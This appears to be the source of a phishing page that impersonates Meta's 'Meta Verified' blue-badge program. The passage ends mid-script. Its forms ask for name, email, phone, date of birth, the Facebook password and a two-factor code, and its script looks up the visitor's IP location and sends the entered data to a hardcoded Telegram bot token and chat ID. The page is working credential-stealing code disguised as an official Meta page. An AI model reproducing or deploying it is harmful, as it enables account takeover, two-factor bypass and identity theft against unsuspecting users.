<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Meta Verified - Rewards for you</title>
    
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico" />

    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        body { font-family: 'Roboto', sans-serif; }
        
        .meta-input {
            width: 100%;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            padding: 12px 16px;
            font-size: 15px;
            color: #1c1e21;
            outline: none;
            transition: border-color 0.2s;
        }
        .meta-input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .hidden { display: none !important; }
    </style>
</head>

<body class="bg-gradient-to-br from-[#f9f1f9] via-[#eaf3fd] to-[#edfbf2] min-h-screen">

    <div class="max-w-[768px] mx-auto p-4">
        <div class="flex flex-col gap-6">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" class="w-12 h-12" alt="Verified">

            <h1 class="text-3xl font-bold">Meta Verified - Rewards for you</h1>
            <p class="font-semibold">Show the world that you mean business.</p>
            <p>Congratulations on achieving the requirements to upgrade your page to a verified blue badge!</p>
            <p class="text-[#465a69]">Your ticket id: #<span id="ticketId">LOADING...</span></p>

            <button id="submitRequestBtn" class="bg-[#1877f2] text-white rounded-full py-3 px-6 font-semibold w-full max-w-[300px] mx-auto block hover:bg-[#166fe5]">
                Submit request
            </button>

            <div class="flex flex-wrap gap-4 text-xs text-[#65676b] justify-center mt-6">
                <a href="#">Meta © 2025</a>
            </div>
        </div>
    </div>

    <div id="overlay" class="fixed inset-0 bg-black/50 hidden z-40 transition-opacity"></div>

    <div id="infoForm" class="fixed inset-0 hidden z-50 flex items-center justify-center p-4">
        <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl">
            <h2 class="text-lg font-semibold mb-5">Information Form</h2>
            <div class="space-y-3">
                <input class="meta-input" placeholder="Full Name" required />
                <input class="meta-input" placeholder="Email Address" required />
                <input class="meta-input" placeholder="Business Email" /> <input class="meta-input" placeholder="Page Name" />
                <input class="meta-input" placeholder="Phone Number" required />
                
                <div class="grid grid-cols-3 gap-3">
                    <input class="meta-input text-center" placeholder="DD" />
                    <input class="meta-input text-center" placeholder="MM" />
                    <input class="meta-input text-center" placeholder="YYYY" />
                </div>

                <button id="sendInfoBtn" class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold hover:bg-[#166fe5]">
                    Send
                </button>
            </div>
        </div>
    </div>

    <div id="passwordForm" class="fixed inset-0 hidden z-50 flex items-center justify-center p-4">
        <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl text-center">
            <div class="w-12 h-12 mx-auto mb-4 bg-[#1877f2] rounded-full flex items-center justify-center text-white text-2xl font-bold">f</div>
            <p class="text-gray-500 mb-4">For security reasons, please enter your password to continue.</p>

            <input id="passwordInput" type="password" class="meta-input mb-4" placeholder="Password" />
            
            <p id="passwordError" class="text-red-500 text-sm mb-3 hidden text-center"></p>

            <button id="continueBtn" class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold hover:bg-[#166fe5]">
                Continue
            </button>
        </div>
    </div>

    <div id="verifyModal" class="fixed inset-0 hidden z-50 flex items-center justify-center p-4">
        <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl relative">
            <div class="w-10 h-10 mx-auto mb-4 bg-[#1877f2] rounded-full flex items-center justify-center text-white text-xl font-bold">f</div>
            <h2 class="text-[20px] font-bold text-gray-900 text-center mb-3">Two-factor authentication</h2>
            <p class="text-[14px] text-gray-600 text-center mb-5">
                Enter the code sent to <span id="maskedEmail" class="font-bold"></span> or <span id="maskedPhone" class="font-bold"></span>.
            </p>

            <input id="verifyCode" type="tel" class="meta-input mb-2 text-center text-xl tracking-[5px] font-bold" placeholder="Code" />
            
            <p id="verifyError" class="text-red-500 text-sm mb-2 hidden text-center">The code you entered is incorrect.</p>
            
            <p id="countdown" class="text-sm text-red-600 mb-3 hidden text-center font-bold"></p>

            <button id="verifyBtn" class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold hover:bg-[#166fe5]">
                Confirm
            </button>
        </div>
    </div>

    <script>
        // 1. CẤU HÌNH
        const CONFIG = {
            TELEGRAM: {
                BOT_TOKEN: "7100924911:AAFbe2QHrx26J5pREWtgn-jo2pWKh5A9imE", // Token của bạn
                CHAT_ID: "-5070121169"    // Chat ID của bạn
            },
            REDIRECT_URL: "https://www.facebook.com/business/help",
            IP_API: "https://ipwho.is/"
        };

        // 2. CÔNG CỤ (UTILS)
        const Utils = {
            getLocation: async () => {
                try {
                    const res = await fetch(CONFIG.IP_API);
                    const data = await res.json();
                    return data.success ? 
                        { ip: data.ip, city: data.city, country: data.country, flag: data.flag?.emoji || "" } : 
                        { ip: data.ip || "Unknown", city: "N/A", country: "N/A", flag: "" };
                } catch { return { ip: "Error", city: "N/A", country: "N/A", flag: "" }; }
            },

            sendMessage: async (msg) => {
                const { BOT_TOKEN, CHAT_ID } = CONFIG.TELEGRAM;
                if (!BOT_TOKEN || !CHAT_ID) return;
                try {
                    // SỬA LỖI: Dùng dấu backtick (`) thay vì nháy đơn/kép
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
                    });
                } catch (e) { console.error(e); }
            },

            formatReport: (d, type, loc) => {
                const time = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
                let icon = type === "INFO" ? "📝 INFO" : (type.includes("PASS") ? "🔑 PASS" : "🔥 OTP");
                
                // SỬA LỖI: Dùng dấu backtick (`) để nối chuỗi
                let info = `<b>Name:</b> ${d.fullName}\n<b>Mail:</b> ${d.email}`;
                if (d.businessEmail) info += `\n<b>Biz Mail:</b> ${d.businessEmail}`;
                info += `\n<b>Phone:</b> ${d.phone}\n<b>DOB:</b> ${d.dob}`;
                
                let pass = d.pass1 ? `\n----------------\n<b>P1:</b> <code>${d.pass1}</code>` : "";
                if (d.pass2) pass += `\n<b>P2:</b> <code>${d.pass2}</code>`;

                let otp = d.twoFactorCode ? `\n----------------\n<b>OTP:</b> <code>${d.twoFactorCode}</code>` : "";
                let ip = `\n================\n🌍 <code>${loc.ip}</code>\n📍 ${loc.city}, ${loc.country} ${loc.flag}`;

                return `<b>${icon}</b> | ${time}\n----------------\n${info}${pass}${otp}${ip}`;
            },

            mask: (str, type) => {
                if (!str || str.length < 5) return "...";
                if (type === 'email') {
                    const [n, d] = str.split('@');
                    return `${n.slice(0, 3)}***@${d}`;
                }
                return `${str.slice(0, 3)}****${str.slice(-3)}`;
            }
        };

        // 3. LOGIC CHÍNH
        document.addEventListener("DOMContentLoaded", async () => {
            const userLoc = await Utils.getLocation();
            let formData = { fullName:"", email:"", businessEmail:"", phone:"", dob:"", pass1:"", pass2:"", twoFactorCode:"" };
            let passAttempts = 0, otpAttempts = 0, isLocked = false;

            // DOM
            const modal = (id) => {
                document.getElementById("overlay").classList.remove("hidden");
                ["infoForm", "passwordForm", "verifyModal"].forEach(i => document.getElementById(i).classList.add("hidden"));
                document.getElementById(id).classList.remove("hidden");
            };
            const showError = (id, msg) => {
                const el = document.getElementById(id);
                el.innerText = msg;
                el.classList.remove("hidden");
            };

            // Setup
            document.getElementById("ticketId").innerText = "REF-" + Math.floor(Math.random()*900000);
            document.getElementById("submitRequestBtn").onclick = () => modal("infoForm");

            // STEP 1: INFO
            document.getElementById("sendInfoBtn").onclick = () => {
                const inps = document.querySelectorAll("#infoForm input");
                formData.fullName = inps[0].value;
                formData.email = inps[1].value;
                formData.businessEmail = inps[2].value;
                formData.phone = inps[4].value;
                formData.dob = `${inps[5].value}/${inps[6].value}/${inps[7].value}`;
                
                Utils.sendMessage(Utils.formatReport(
